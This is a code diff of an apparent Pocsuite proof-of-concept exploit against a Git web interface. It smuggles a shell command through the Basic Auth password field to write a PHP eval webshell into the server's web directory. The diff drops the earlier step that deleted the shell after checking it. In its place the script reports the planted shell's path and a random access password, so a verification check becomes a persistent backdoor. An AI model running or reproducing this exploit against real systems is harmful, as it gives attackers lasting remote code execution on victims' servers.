@@ -1,6 +1,5 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# from pocsuite.api.request import req
 from pocsuite.api.poc import register, Output, POCBase
 from requests.auth import HTTPBasicAuth
 import requests
@@ -31,7 +30,7 @@ class TestPOC(POCBase):
     samples = []
     install_requires = []
 
-    def _verify(self):
+    def _attack(self):
         result = {}
         target = self.url
         hostname = urlparse.urlparse(target).hostname
@@ -66,30 +65,23 @@ class TestPOC(POCBase):
             "{}/rest/repository/{}/user/{}/".format(target, repository, "everyone"))
         random_file_name = ''.join(random.sample(string.ascii_letters+string.digits, 16))+".php"
         random_identify_code = ''.join(random.sample(string.ascii_letters+string.digits, 35))
-        # webshell = 'p && echo "<?php echo"'+random_identify_code+'"; ?>" > c:'
-        webshell = 'p && echo " <?php @eval($_POST[value]);echo"'+random_identify_code+'";?>" > c:'
-
-        del_webshell = 'p && echo " <?php unlink("{}");unlink("{}")?>" > c:'.format(
-            random_file_name, "del.php")
-
+        random_shell_pass = ''.join(random.sample(string.ascii_letters+string.digits, 5))
+        webshell = 'p && echo " <?php @eval($_POST['+random_shell_pass+']);echo"' + \
+            random_identify_code+'";?>" > c:'
         r_create_file = requests.get('{}/web/index.php?p={}.git&a=summary'.format(
             target, repository), auth=HTTPBasicAuth(username, "{}".format(webshell)+random_file_name))
         test_url = target+"/web/"+random_file_name
-        r_verify = requests.get(test_url)
-        if (r_verify.status_code == 200):
-            if (random_identify_code in r_verify.text):
+        r_attack = requests.get(test_url)
+        if (r_attack.status_code == 200):
+            if (random_identify_code in r_attack.text):
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
-                # result['VerifyInfo']['Result'] = test_url
-                # 触发文件删除
-                r = requests.get('{}/web/index.php?p={}.git&a=summary'.format(target, repository),
-                                 auth=HTTPBasicAuth(username, "{}".format(del_webshell)+"del.php"))
-                r = requests.get(target+"/web/del.php")
-                ##
+                result['VerifyInfo']['ShellPath'] = test_url
+                result['VerifyInfo']['ShellPasswd'] = random_shell_pass
             pass
         return self.parse_output(result)
 
-    _attack = _verify
+    _verify = _attack
 
     def parse_output(self, result):
         output = Output(self)
